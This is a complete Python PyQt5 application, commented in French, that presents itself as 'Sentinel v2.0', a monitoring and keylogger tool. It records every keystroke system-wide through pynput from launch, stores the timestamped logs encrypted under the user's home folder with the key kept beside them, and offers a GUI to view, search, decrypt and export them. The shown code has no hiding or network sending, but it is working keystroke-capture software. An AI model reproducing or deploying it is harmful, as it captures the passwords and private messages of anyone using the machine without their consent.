#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Xyconis Sentinel v2.0 - Design "22-Modern UI" + Dialogues + Multiples Thèmes
===========================================================================

- Keylogger (pynput)
- Gestion des fichiers (FileManager) et chiffrement (EncryptionManager)
- LogManager pour lire/écrire/effacer/exporter
- Interface PyQt5 moderne :
    * Barre supérieure sombre (titre + icônes)
    * Menu latéral sombre avec boutons (icône + texte)
    * Zone centrale avec sous-barre (recherche, statut, stats) + 2 cadres logs
- Recherche en temps réel (filtrage) dans logs chiffrés/déchiffrés
- Boutons pour pause, actualiser, exporter, effacer
- Boutons "Settings" et "Information" ouvrant des boîtes de dialogue
- 4 thèmes : "Modern Dark", "Light", "Blue", "Green"
- Les pop-ups Settings et Information ont une taille fixe
"""

import os
import sys
import threading
import time
import logging
import base64
from datetime import datetime

from PyQt5.QtCore import (
    Qt, QSize, QTimer, pyqtSlot, QObject, pyqtSignal
)
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QHBoxLayout, QVBoxLayout,
    QFrame, QLabel, QPushButton, QToolButton, QLineEdit, QTextEdit,
    QFileDialog, QMessageBox, QSpacerItem, QSizePolicy, QDialog,
    QCheckBox, QComboBox, QSpinBox, QDialogButtonBox
)

from pynput import keyboard
from cryptography.fernet import Fernet

# -------------------------------------
# Configuration du logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    filename='xyconis_sentinel.log',
    filemode='a'
)

# ===============================
# === Module 1: Fichiers & Chiffrement ===

class FileManager:
    def __init__(self, app_folder=".securetype"):
        self.app_folder = os.path.join(os.path.expanduser("~"), app_folder)
        try:
            os.makedirs(self.app_folder, exist_ok=True)
        except Exception as e:
            logging.error(f"Erreur lors de la création du dossier d'application: {e}")

    def get_file_path(self, filename):
        return os.path.join(self.app_folder, filename)

    def read_file(self, filename, binary=False):
        path = self.get_file_path(filename)
        mode = "rb" if binary else "r"
        if os.path.exists(path):
            try:
                with open(path, mode) as f:
                    return f.read()
            except Exception as e:
                logging.error(f"Erreur de lecture du fichier {filename}: {e}")
        return None

    def write_file(self, filename, content, binary=False):
        path = self.get_file_path(filename)
        mode = "wb" if binary else "w"
        try:
            with open(path, mode) as f:
                f.write(content)
        except Exception as e:
            logging.error(f"Erreur d'écriture dans le fichier {filename}: {e}")

    def append_file(self, filename, content, binary=False):
        path = self.get_file_path(filename)
        mode = "ab" if binary else "a"
        try:
            with open(path, mode) as f:
                f.write(content)
        except Exception as e:
            logging.error(f"Erreur d'ajout dans le fichier {filename}: {e}")

    def delete_file(self, filename):
        path = self.get_file_path(filename)
        if os.path.exists(path):
            try:
                os.remove(path)
                return True
            except Exception as e:
                logging.error(f"Erreur lors de la suppression du fichier {filename}: {e}")
        return False

class EncryptionManager:
    def __init__(self, file_manager, key_filename="cle_chiffrement.key"):
        self.file_manager = file_manager
        self.key_filename = key_filename
        self.key = self._load_or_create_key()

    def _load_or_create_key(self):
        key = self.file_manager.read_file(self.key_filename, binary=True)
        if not key:
            try:
                key = Fernet.generate_key()
                self.file_manager.write_file(self.key_filename, key, binary=True)
            except Exception as e:
                logging.error(f"Erreur lors de la création de la clé de chiffrement: {e}")
        return key

    def encrypt(self, text):
        try:
            cipher = Fernet(self.key)
            enc_bytes = cipher.encrypt(text.encode())
            return base64.b64encode(enc_bytes).decode()
        except Exception as e:
            logging.error(f"Erreur de chiffrement: {e}")
            return None

    def decrypt(self, enc_text):
        try:
            cipher = Fernet(self.key)
            return cipher.decrypt(base64.b64decode(enc_text.strip())).decode()
        except Exception as e:
            logging.error(f"Erreur de déchiffrement: {e}")
            return "[Erreur de déchiffrement]"

# ===============================
# === Module 2: KeyLogger & LogManager ===

class KeyLogger:
    def __init__(self, callback):
        self.callback = callback
        self.running = True
        self.listener = None

    def start(self):
        if not self.listener or not self.listener.is_alive():
            self.running = True
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()
            logging.info("Keylogger démarré.")

    def stop(self):
        self.running = False
        if self.listener and self.listener.is_alive():
            self.listener.stop()
            logging.info("Keylogger arrêté.")

    def _on_key_press(self, key):
        if not self.running:
            return
        try:
            key_text = str(key)
            if key_text.startswith("Key."):
                key_text = f"[{key_text.split('.')[1]}]"
            else:
                key_text = key_text.strip("'")
        except Exception as e:
            key_text = "[Touche spéciale]"
            logging.error(f"Erreur lors du traitement de la touche: {e}")
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.callback(f"{timestamp}: {key_text}")

class LogManager:
    def __init__(self, file_manager, encryption_manager, log_filename="log_chiffre.txt"):
        self.file_manager = file_manager
        self.encryption_manager = encryption_manager
        self.log_filename = log_filename

    def add_log(self, text):
        enc = self.encryption_manager.encrypt(text)
        if enc:
            self.file_manager.append_file(self.log_filename, enc + "\n")
            return enc
        return None

    def get_logs(self):
        c = self.file_manager.read_file(self.log_filename)
        if c:
            return c.splitlines()
        return []

    def clear_logs(self):
        if self.file_manager.delete_file(self.log_filename):
            logging.info("Logs effacés.")
            return True
        logging.error("Erreur lors de l'effacement des logs.")
        return False

    def export_logs(self, path, encrypted=False):
        logs = self.get_logs()
        if not logs:
            return False
        try:
            with open(path, "w") as f:
                for line in logs:
                    if encrypted:
                        f.write(line + "\n")
                    else:
                        dec = self.encryption_manager.decrypt(line)
                        f.write(dec + "\n")
            logging.info(f"Logs exportés vers {path}.")
            return True
        except Exception as e:
            logging.error(f"Erreur lors de l'exportation des logs: {e}")
            return False

    def search_in_logs(self, search_term):
        if not search_term:
            return []
        logs = self.get_logs()
        results = []
        for line in logs:
            dec = self.encryption_manager.decrypt(line)
            if search_term.lower() in dec.lower():
                results.append(dec)
        return results

# ===============================
# === Signaux pour mise à jour UI (thread-safety) ===

class KeyUpdateSignal(QObject):
    key_received = pyqtSignal(str, str)   # (encrypted, plain)
    stats_updated = pyqtSignal(int, str)  # (total_keys, last_time)

# ===============================
# === Thèmes supplémentaires ===

THEMES = {
    "Modern Dark": """
    QMainWindow {
        background-color: #2b2f38;
    }
    QFrame#TopBar {
        background-color: #2f353f;
        min-height: 40px;
    }
    QLabel#TopBarTitle {
        color: #f0f0f0;
        font-size: 16px;
        font-weight: bold;
    }
    QToolButton {
        background: transparent;
        color: #f0f0f0;
    }
    QToolButton:hover {
        background-color: #3a3f48;
    }

    QFrame#SideBar {
        background-color: #21252b;
    }
    QPushButton#SideBarButton {
        background-color: transparent;
        border: none;
        text-align: left;
        padding: 8px 20px;
        font-size: 14px;
        color: #c8c8c8;
    }
    QPushButton#SideBarButton:hover {
        background-color: #2d333b;
    }
    QPushButton#SideBarButton:checked {
        background-color: #38414a;
    }

    QFrame#ContentArea {
        background-color: #2b2f38;
    }
    QFrame#Card {
        background-color: #2f3542;
        border-radius: 5px;
    }
    QLabel {
        color: #dddddd;
    }
    QTextEdit {
        background-color: #3b3f48;
        border: 1px solid #565a63;
        border-radius: 4px;
        color: #ffffff;
    }
    QLineEdit {
        background-color: #3b3f48;
        border: 1px solid #565a63;
        border-radius: 4px;
        color: #ffffff;
        padding: 4px;
    }

    QLabel#StatusLabel {
        font-size:16px;
        font-weight:bold;
    }
    /* Popups (QDialog, QMessageBox) : fond blanc, texte noir */
    QDialog, QMessageBox {
        background-color: #FFFFFF;
        color: #000000;
    }
    QDialog QLabel, QMessageBox QLabel {
        color: #000000;
    }
    """,

    "Light": """
    QMainWindow {
        background-color: #f0f0f0;
    }
    QFrame#TopBar {
        background-color: #dadada;
        min-height: 40px;
    }
    QLabel#TopBarTitle {
        color: #333333;
        font-size: 16px;
        font-weight: bold;
    }
    QToolButton {
        background: transparent;
        color: #333333;
    }
    QToolButton:hover {
        background-color: #e0e0e0;
    }

    QFrame#SideBar {
        background-color: #eeeeee;
    }
    QPushButton#SideBarButton {
        background-color: transparent;
        border: none;
        text-align: left;
        padding: 8px 20px;
        font-size: 14px;
        color: #444444;
    }
    QPushButton#SideBarButton:hover {
        background-color: #dddddd;
    }
    QPushButton#SideBarButton:checked {
        background-color: #cccccc;
    }

    QFrame#ContentArea {
        background-color: #f0f0f0;
    }
    QFrame#Card {
        background-color: #ffffff;
        border-radius: 5px;
        border: 1px solid #cccccc;
    }
    QLabel {
        color: #333333;
    }
    QTextEdit {
        background-color: #ffffff;
        border: 1px solid #cccccc;
        border-radius: 4px;
        color: #000000;
    }
    QLineEdit {
        background-color: #ffffff;
        border: 1px solid #cccccc;
        border-radius: 4px;
        color: #000000;
        padding: 4px;
    }

    QLabel#StatusLabel {
        font-size:16px;
        font-weight:bold;
        color: #333333;
    }
    QDialog, QMessageBox {
        background-color: #FFFFFF;
        color: #000000;
    }
    QDialog QLabel, QMessageBox QLabel {
        color: #000000;
    }
    """,

    "Blue": """
    QMainWindow {
        background-color: #dcefff;
    }
    QFrame#TopBar {
        background-color: #4a90e2;
        min-height: 40px;
    }
    QLabel#TopBarTitle {
        color: #ffffff;
        font-size: 16px;
        font-weight: bold;
    }
    QToolButton {
        background: transparent;
        color: #ffffff;
    }
    QToolButton:hover {
        background-color: #5ba1f2;
    }

    QFrame#SideBar {
        background-color: #375a7f;
    }
    QPushButton#SideBarButton {
        background-color: transparent;
        border: none;
        text-align: left;
        padding: 8px 20px;
        font-size: 14px;
        color: #dcefff;
    }
    QPushButton#SideBarButton:hover {
        background-color: #2c4866;
    }
    QPushButton#SideBarButton:checked {
        background-color: #203650;
    }

    QFrame#ContentArea {
        background-color: #dcefff;
    }
    QFrame#Card {
        background-color: #ffffff;
        border-radius: 5px;
        border: 1px solid #aaccee;
    }
    QLabel {
        color: #333333;
    }
    QTextEdit {
        background-color: #ffffff;
        border: 1px solid #aaccee;
        border-radius: 4px;
        color: #000000;
    }
    QLineEdit {
        background-color: #ffffff;
        border: 1px solid #aaccee;
        border-radius: 4px;
        color: #000000;
        padding: 4px;
    }

    QLabel#StatusLabel {
        font-size:16px;
        font-weight:bold;
        color: #375a7f;
    }
    QDialog, QMessageBox {
        background-color: #FFFFFF;
        color: #000000;
    }
    QDialog QLabel, QMessageBox QLabel {
        color: #000000;
    }
    """,

    "Green": """
    QMainWindow {
        background-color: #e9f8ec;
    }
    QFrame#TopBar {
        background-color: #2ecc71;
        min-height: 40px;
    }
    QLabel#TopBarTitle {
        color: #ffffff;
        font-size: 16px;
        font-weight: bold;
    }
    QToolButton {
        background: transparent;
        color: #ffffff;
    }
    QToolButton:hover {
        background-color: #34d585;
    }

    QFrame#SideBar {
        background-color: #27ae60;
    }
    QPushButton#SideBarButton {
        background-color: transparent;
        border: none;
        text-align: left;
        padding: 8px 20px;
        font-size: 14px;
        color: #e9f8ec;
    }
    QPushButton#SideBarButton:hover {
        background-color: #229a54;
    }
    QPushButton#SideBarButton:checked {
        background-color: #1f8a4b;
    }

    QFrame#ContentArea {
        background-color: #e9f8ec;
    }
    QFrame#Card {
        background-color: #ffffff;
        border-radius: 5px;
        border: 1px solid #a2e2b4;
    }
    QLabel {
        color: #2c3e50;
    }
    QTextEdit {
        background-color: #ffffff;
        border: 1px solid #a2e2b4;
        border-radius: 4px;
        color: #2c3e50;
    }
    QLineEdit {
        background-color: #ffffff;
        border: 1px solid #a2e2b4;
        border-radius: 4px;
        color: #2c3e50;
        padding: 4px;
    }

    QLabel#StatusLabel {
        font-size:16px;
        font-weight:bold;
        color: #27ae60;
    }
    QDialog, QMessageBox {
        background-color: #FFFFFF;
        color: #000000;
    }
    QDialog QLabel, QMessageBox QLabel {
        color: #000000;
    }
    """
}

# ===============================
# === Dialogues Settings & Information ===

class SettingsDialog(QDialog):
    """
    Boîte de dialogue "Paramètres" pour configurer quelques options.
    + Sélecteur de thème (4 thèmes : "Modern Dark", "Light", "Blue", "Green")
    + Taille fixe (non redimensionnable)
    """
    def __init__(self, parent=None, current_theme="Modern Dark"):
        super().__init__(parent)
        self.setWindowTitle("Paramètres")

        # Rendre la fenêtre fixe
        self.setFixedSize(400, 350)

        self.current_theme = current_theme

        layout = QVBoxLayout(self)

        # Exemple d'options
        self.check_encryption = QCheckBox("Activer le chiffrement (recommandé)")
        self.check_encryption.setChecked(True)  # par défaut
        layout.addWidget(self.check_encryption)

        self.check_autostart = QCheckBox("Démarrer le keylogger au lancement")
        layout.addWidget(self.check_autostart)

        # Choix d'un niveau de log
        layout.addSpacing(10)
        label_level = QLabel("Niveau de verbosité du logging :")
        layout.addWidget(label_level)
        self.combo_level = QComboBox()
        self.combo_level.addItems(["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"])
        self.combo_level.setCurrentText("INFO")
        layout.addWidget(self.combo_level)

        # Choix du délai d'écriture sur disque (exemple)
        layout.addSpacing(10)
        label_delay = QLabel("Délai (en secondes) entre chaque flush sur disque :")
        layout.addWidget(label_delay)
        self.spin_delay = QSpinBox()
        self.spin_delay.setRange(1, 60)
        self.spin_delay.setValue(5)
        layout.addWidget(self.spin_delay)

        # Sélecteur de thème
        layout.addSpacing(10)
        label_theme = QLabel("Choisir un thème :")
        layout.addWidget(label_theme)
        self.combo_theme = QComboBox()
        self.combo_theme.addItems(["Modern Dark", "Light", "Blue", "Green"])
        self.combo_theme.setCurrentText(self.current_theme)
        layout.addWidget(self.combo_theme)

        layout.addStretch()

        # Boutons OK / Annuler
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        button_box.accepted.connect(self.accept)  # si on clique OK
        button_box.rejected.connect(self.reject)  # si on clique Annuler
        layout.addWidget(button_box)

    def get_settings(self):
        """
        Retourne un dict des paramètres sélectionnés par l'utilisateur.
        """
        return {
            "encryption_enabled": self.check_encryption.isChecked(),
            "autostart_keylogger": self.check_autostart.isChecked(),
            "log_level": self.combo_level.currentText(),
            "flush_delay": self.spin_delay.value(),
            "theme": self.combo_theme.currentText()
        }

class InformationDialog(QDialog):
    """
    Boîte de dialogue "Information" pour afficher des infos sur l'application,
    la version, l'auteur, etc. (taille fixe)
    """
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("À propos")

        # Rendre la fenêtre fixe
        self.setFixedSize(400, 210)

        layout = QVBoxLayout(self)

        label_info = QLabel(
            "<h3>Sentinel v2.0</h3>"
            "<p>Application de monitoring et keylogger.</p>"
            "<p><b>Auteur :</b> John Doe (exemple)</p>"
            "<p><b>Site :</b> <a href='https://example.com'>example.com</a></p>"
            "<p>© 2025, Xyconis. Tous droits réservés.</p>"
        )
        label_info.setOpenExternalLinks(True)  # Pour activer le clic sur le lien
        label_info.setWordWrap(True)
        layout.addWidget(label_info)

        layout.addStretch()

        # Bouton de fermeture
        button_box = QDialogButtonBox(QDialogButtonBox.Close)
        button_box.rejected.connect(self.reject)
        button_box.accepted.connect(self.accept)
        layout.addWidget(button_box)

# ===============================
# === Application Principale ===

class ModernSentinelApp(QMainWindow):
    """
    Interface "22-Modern UI" + Sentinel v2.0
    - Ajout de deux boîtes de dialogue : SettingsDialog et InformationDialog
    - 4 thèmes disponibles, sélectionnables dans les paramètres
    - Les pop-ups Settings et Information ont une taille fixe
    """
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Sentinel v2.0")
        self.resize(1200, 700)

        # État
        self.is_paused = False
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.total_keys = 0
        self.last_time = "--:--:--"
        self.current_theme = "Modern Dark"  # Thème par défaut

        # Modules
        self.file_manager = FileManager()
        self.encryption_manager = EncryptionManager(self.file_manager)
        self.log_manager = LogManager(self.file_manager, self.encryption_manager)

        # Signaux
        self.key_update_signal = KeyUpdateSignal()
        self.key_update_signal.key_received.connect(self._update_logs_slot)
        self.key_update_signal.stats_updated.connect(self._update_stats_slot)

        # UI
        self._init_ui()
        self._apply_styles()

        # Démarrage keylogger + thread
        self._start_services()

        # Timer pour rafraîchir l'affichage des stats
        self.stats_timer = QTimer(self)
        self.stats_timer.timeout.connect(self._refresh_stats)
        self.stats_timer.start(200)

    # ------------------ PARTIE UI ------------------

    def _init_ui(self):
        # Widget central
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        # Layout principal vertical (topbar + zone corps)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # 1) Barre supérieure
        self.topbar = self._create_topbar()
        main_layout.addWidget(self.topbar)

        # 2) Corps : sidebar + contenu
        body_frame = QFrame()
        body_layout = QHBoxLayout(body_frame)
        body_layout.setContentsMargins(0, 0, 0, 0)
        body_layout.setSpacing(0)

        # Menu latéral
        self.sidebar = self._create_sidebar()
        body_layout.addWidget(self.sidebar)

        # Zone de contenu
        self.content = self._create_content_area()
        body_layout.addWidget(self.content)

        main_layout.addWidget(body_frame)

    def _create_topbar(self) -> QFrame:
        """
        Barre supérieure : titre à gauche, icônes (notifications, profil) à droite
        """
        topbar = QFrame()
        topbar.setObjectName("TopBar")

        hlayout = QHBoxLayout(topbar)
        hlayout.setContentsMargins(15, 0, 15, 0)
        hlayout.setSpacing(10)

        # Titre
        self.title_label = QLabel("SENTINEL")
        self.title_label.setObjectName("TopBarTitle")
        hlayout.addWidget(self.title_label)

        # Espace intermédiaire
        hlayout.addStretch()

        # Icône notifications
        self.btn_notifications = QToolButton()
        self.btn_notifications.setIcon(QIcon("icons/bell.png"))  # À adapter
        self.btn_notifications.setIconSize(QSize(20, 20))
        self.btn_notifications.setToolTip("Notifications")
        hlayout.addWidget(self.btn_notifications)

        # Icône profil
        self.btn_profile = QToolButton()
        self.btn_profile.setIcon(QIcon("icons/user.png"))  # À adapter
        self.btn_profile.setIconSize(QSize(20, 20))
        self.btn_profile.setToolTip("Profile")
        hlayout.addWidget(self.btn_profile)

        return topbar

    def _create_sidebar(self) -> QFrame:
        """
        Barre latérale avec boutons : Pause, Actualiser, Exporter, Effacer
        et en bas : Settings, Information + label bas de page
        """
        sidebar = QFrame()
        sidebar.setObjectName("SideBar")
        sidebar.setFixedWidth(200)

        vlayout = QVBoxLayout(sidebar)
        vlayout.setContentsMargins(0, 10, 0, 10)
        vlayout.setSpacing(5)

        # Boutons du haut
        self.btn_pause = self._create_menu_button("Pause", "icons/pause.png")
        self.btn_pause.clicked.connect(self._toggle_pause)
        vlayout.addWidget(self.btn_pause)

        self.btn_refresh = self._create_menu_button("Actualiser Logs", "icons/refresh.png")
        self.btn_refresh.clicked.connect(self._refresh_logs)
        vlayout.addWidget(self.btn_refresh)

        self.btn_export = self._create_menu_button("Exporter Logs", "icons/export.png")
        self.btn_export.clicked.connect(self._export_logs_dialog)
        vlayout.addWidget(self.btn_export)

        self.btn_clear = self._create_menu_button("Effacer Logs", "icons/clear.png")
        self.btn_clear.clicked.connect(self._clear_logs)
        vlayout.addWidget(self.btn_clear)

        # Espace intermédiaire
        vlayout.addSpacerItem(QSpacerItem(20, 20, QSizePolicy.Minimum, QSizePolicy.Expanding))

        # Bas du menu
        self.btn_settings = self._create_menu_button("Settings", "icons/settings.png")
        self.btn_settings.clicked.connect(self._open_settings)
        vlayout.addWidget(self.btn_settings)

        self.btn_info = self._create_menu_button("Information", "icons/info.png")
        self.btn_info.clicked.connect(self._open_information)
        vlayout.addWidget(self.btn_info)

        # Label bas de page
        self.lbl_copyright = QLabel("© 2025, Xyconis")
        self.lbl_copyright.setObjectName("Copyright")
        self.lbl_copyright.setAlignment(Qt.AlignCenter)
        vlayout.addWidget(self.lbl_copyright)

        return sidebar

    def _create_menu_button(self, text: str, icon_path: str) -> QPushButton:
        btn = QPushButton(text)
        btn.setObjectName("SideBarButton")
        btn.setIcon(QIcon(icon_path))
        btn.setIconSize(QSize(20, 20))
        btn.setMinimumHeight(40)
        btn.setCheckable(False)
        return btn

    def _create_content_area(self) -> QFrame:
        """
        Zone centrale :
        - une petite barre (statut, search, stats)
        - deux cadres logs (chiffrés / déchiffrés)
        """
        content = QFrame()
        content.setObjectName("ContentArea")

        main_layout = QVBoxLayout(content)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # Sous-barre : statut, champ recherche, stats
        sub_top_bar = QFrame()
        sub_top_bar_layout = QHBoxLayout(sub_top_bar)
        sub_top_bar_layout.setContentsMargins(10, 5, 10, 5)
        sub_top_bar_layout.setSpacing(10)

        self.status_label = QLabel("Statut : Actif")
        self.status_label.setObjectName("StatusLabel")
        sub_top_bar_layout.addWidget(self.status_label)

        sub_top_bar_layout.addStretch()

        self.search_edit = QLineEdit()
        self.search_edit.setPlaceholderText("Rechercher en temps réel...")
        self.search_edit.setFixedWidth(300)
        self.search_edit.textChanged.connect(self._update_filtered_logs)
        sub_top_bar_layout.addWidget(self.search_edit)

        self.stats_label = QLabel("Total frappes : 0 | Dernière frappe : --:--:--")
        sub_top_bar_layout.addWidget(self.stats_label)

        main_layout.addWidget(sub_top_bar, 0)

        # Corps : 2 cadres logs
        logs_layout = QHBoxLayout()
        logs_layout.setSpacing(15)
        logs_layout.setContentsMargins(10, 10, 10, 10)

        # Card logs chiffrés
        card_enc = QFrame()
        card_enc.setObjectName("Card")
        card_enc_layout = QVBoxLayout(card_enc)
        enc_title = QLabel("Logs Chiffrés")
        enc_title.setStyleSheet("font-weight:bold; font-size:16px;")
        card_enc_layout.addWidget(enc_title)

        self.text_encrypted = QTextEdit()
        self.text_encrypted.setReadOnly(True)
        card_enc_layout.addWidget(self.text_encrypted)

        # Card logs déchiffrés
        card_dec = QFrame()
        card_dec.setObjectName("Card")
        card_dec_layout = QVBoxLayout(card_dec)
        dec_title = QLabel("Logs Déchiffrés")
        dec_title.setStyleSheet("font-weight:bold; font-size:16px;")
        card_dec_layout.addWidget(dec_title)

        self.text_decrypted = QTextEdit()
        self.text_decrypted.setReadOnly(True)
        card_dec_layout.addWidget(self.text_decrypted)

        logs_layout.addWidget(card_enc, 1)
        logs_layout.addWidget(card_dec, 1)

        main_layout.addLayout(logs_layout, 1)

        return content

    # ------------------ APPLICATION DU THÈME ------------------

    def _apply_styles(self):
        """
        Applique le style en fonction du thème courant self.current_theme
        """
        if self.current_theme in THEMES:
            self.setStyleSheet(THEMES[self.current_theme])
        else:
            # Si jamais le thème n'existe pas, on applique le "Modern Dark"
            self.setStyleSheet(THEMES["Modern Dark"])

        # Mise à jour de la couleur du label statut selon l'état
        if self.is_paused:
            self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color: #FF2E63;")
        else:
            self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color: #08D9D6;")

    # ------------------ PARTIE KEYLOGGER + LOGS ------------------

    def _start_services(self):
        self.keylogger = KeyLogger(self._handle_key_press)
        self.keylogger.start()
        self.buffer_thread = threading.Thread(target=self._process_buffer, daemon=True)
        self.buffer_thread.start()

    def _handle_key_press(self, key_text):
        if self.is_paused:
            return
        enc = self.encryption_manager.encrypt(key_text)
        if enc:
            with self.buffer_lock:
                self.buffer.append((enc, key_text))

    def _process_buffer(self):
        while True:
            if self.buffer:
                with self.buffer_lock:
                    encrypted, plain = self.buffer.pop(0)
                # Enregistrement dans le fichier
                self.log_manager.add_log(plain)
                # Mise à jour de l'UI via signaux
                self.total_keys += 1
                now = datetime.now().strftime('%H:%M:%S')
                self.last_time = now
                self.key_update_signal.key_received.emit(encrypted, plain)
                self.key_update_signal.stats_updated.emit(self.total_keys, now)
            time.sleep(0.01)

    @pyqtSlot(str, str)
    def _update_logs_slot(self, encrypted, plain):
        # À chaque frappe ajoutée, on relance le filtrage en temps réel
        self._update_filtered_logs()

    @pyqtSlot(int, str)
    def _update_stats_slot(self, total, now):
        # Mise à jour label stats
        self.stats_label.setText(f"Total frappes : {total} | Dernière frappe : {now}")

    def _refresh_stats(self):
        self.stats_label.setText(f"Total frappes : {self.total_keys} | Dernière frappe : {self.last_time}")

    def _update_filtered_logs(self):
        """
        Filtrage en temps réel : on relit tous les logs chiffrés,
        on les déchiffre, et on affiche ceux qui contiennent le terme recherché.
        """
        search_term = self.search_edit.text().strip().lower()
        all_encrypted = self.log_manager.get_logs()

        self.text_encrypted.clear()
        self.text_decrypted.clear()

        for enc_line in all_encrypted:
            dec_line = self.encryption_manager.decrypt(enc_line)
            if not search_term or (search_term in dec_line.lower()):
                self.text_encrypted.append(enc_line)
                self.text_decrypted.append(dec_line)

    # ------------------ BOUTONS SIDEBAR ------------------

    def _toggle_pause(self):
        self.is_paused = not self.is_paused
        if self.is_paused:
            self.btn_pause.setText("Reprendre")
            self.btn_pause.setIcon(QIcon("icons/play.png"))  # Adaptez l'icône
            self.status_label.setText("Statut : Pause")
            self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color: #FF2E63;")
        else:
            self.btn_pause.setText("Pause")
            self.btn_pause.setIcon(QIcon("icons/pause.png"))  # Adaptez l'icône
            self.status_label.setText("Statut : Actif")
            self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color: #08D9D6;")

    def _refresh_logs(self):
        self._update_filtered_logs()

    def _export_logs_dialog(self):
        path, _ = QFileDialog.getSaveFileName(
            self,
            "Exporter Logs",
            "",
            "Fichiers texte (*.txt);;Tous les fichiers (*)"
        )
        if not path:
            return
        rep = QMessageBox.question(
            self,
            "Exporter",
            "Exporter les logs chiffrés ?\nOui pour chiffrés, Non pour déchiffrés.",
            QMessageBox.Yes | QMessageBox.No
        )
        enc = (rep == QMessageBox.Yes)
        if self.log_manager.export_logs(path, enc):
            QMessageBox.information(self, "Exportation", "Logs exportés avec succès!")
        else:
            QMessageBox.critical(self, "Erreur", "Échec de l'exportation des logs.")

    def _clear_logs(self):
        rep = QMessageBox.question(
            self,
            "Confirmation",
            "Êtes-vous sûr de vouloir effacer tous les logs?",
            QMessageBox.Yes | QMessageBox.No
        )
        if rep == QMessageBox.Yes:
            if self.log_manager.clear_logs():
                self.text_encrypted.clear()
                self.text_decrypted.clear()
                self.total_keys = 0
                self.last_time = "--:--:--"
                self.stats_label.setText("Total frappes : 0 | Dernière frappe : --:--:--")
                QMessageBox.information(self, "Information", "Tous les logs ont été effacés.")
            else:
                QMessageBox.critical(self, "Erreur", "Impossible d'effacer les logs.")

    # ------------------ SETTINGS & INFORMATION ------------------

    def _open_settings(self):
        dialog = SettingsDialog(self, current_theme=self.current_theme)
        if dialog.exec_() == QDialog.Accepted:
            # Récupération des paramètres
            settings = dialog.get_settings()
            logging.info(f"Settings mis à jour : {settings}")

            # 1) Appliquer le thème choisi
            self.current_theme = settings["theme"]
            self._apply_styles()

            # 2) etc.

    def _open_information(self):
        dialog = InformationDialog(self)
        dialog.exec_()

    # ------------------ FERMETURE ------------------

    def closeEvent(self, event):
        # Arrêter le keylogger proprement
        if hasattr(self, 'keylogger') and self.keylogger:
            self.keylogger.stop()
        logging.info("Fermeture de l'application.")
        super().closeEvent(event)

# ===============================
# === Point d'entrée principal ===

def main():
    app = QApplication(sys.argv)
    window = ModernSentinelApp()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
